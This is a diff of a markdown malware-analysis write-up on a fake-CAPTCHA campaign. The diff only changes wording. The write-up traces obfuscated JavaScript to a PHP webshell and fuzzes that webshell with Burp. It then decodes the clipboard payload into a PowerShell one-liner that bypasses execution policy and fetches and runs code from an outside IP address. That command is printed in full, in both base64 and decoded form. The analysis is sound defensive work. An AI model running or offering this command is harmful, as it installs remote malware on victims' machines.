@@ -30,7 +30,7 @@ For this documentation, I'll only be focusing on fasfttt.js.
 That is a whole lot of obfuscated code. But if we look a little closer we can see some base64 hidden in there (highlighted area).<br>
 Throwing that into a decoder, it came out to: "https[:]//www[.]windowwashingexpert[.]com/lma.php".
 
-I did briefly attempt to deobfuscate the JavaScript as well, but all I could tell was that it was excessively looping to get a specific string value, and based off certain clues in the code like "__sync_load" and "sessionStorage", it can be assumed that other than externally loading the php site we found, it was probably gathering data like hostname and timestamp.
+I did briefly attempt to deobfuscate the JavaScript as well, but all I could tell was that it was excessively looping to get a specific string value, and based off certain clues in the code like `__sync_load` and `sessionStorage`, it can be assumed that other than externally loading the php site we found, it was probably gathering data like hostname and timestamp.
 
 So now that we have this suspicious php webshell, what do we do with it? The JavaScript is already suspicious enough, but we still don't have anything to deem it malicious.<br>
 This is where Burp comes in handy. We'll intercept and see what we can pull from it.
@@ -43,12 +43,12 @@ I found a small list of commonly used webshell payloads and crossed my fingers. 
 ![alt text](images/DeadtoC2images/payload-results.png)
 
 The length on "page" seems promising. (The image lacks the /lma.php at the end of the shown url, but we are attacking the php file.)<br>
-Lets throw that into the Responder and see what comes up.
+Let's throw that into the Responder and see what comes up.
 
 ![alt text](images/DeadtoC2images/page-results.png)
 
 In the Response we have another base64 encryption and HTML!<br>
-Before we touch that base64, lets take a look at what this HTML page displaying.
+Before we touch that base64, let's take a look at what this HTML page displaying.
 
 ![alt text](images/DeadtoC2images/verify.png)
 ![alt text](images/DeadtoC2images/verify2.png)
@@ -58,11 +58,11 @@ In the first image we see that this is a CAPTCHA request. The "Verify you are hu
 In the second image we get an idea of what happens when we click the checkbox.<br>
 First we get an error for "Unusual Web Traffic Detected" so we need you do the following 3 steps of pressing "Win +R" and copy and pasting whatever command is on your clipboard.<br>
 At the very bottom we see a code for your computer auto copying on click and at the top of that image we have the variable copyCommand to equal a base64. This base64 we found at the very top our Burp results.<br>
-Lets decode that.<br>
+Let's decode that.<br>
 Base64: cG93ZXJzaGVsbCAtd2kgbWkgLUVQIEIgLWMgaWV4KGlybSAxOTMuMTExLjExNy4yMjYvVi5HUkUp<br>
 Decoded: powershell -wi mi -EP B -c iex(irm 193.111.117.226/V.GRE)
 
-Lets dissect that.<br>
+Let's dissect that.<br>
 ・launches powershell<br>
 ・-wi mi runs it minimized (otherwise hidden)<br>
 ・-EP B sets the execution policy to Bypass (disabling security restrictions)<br>
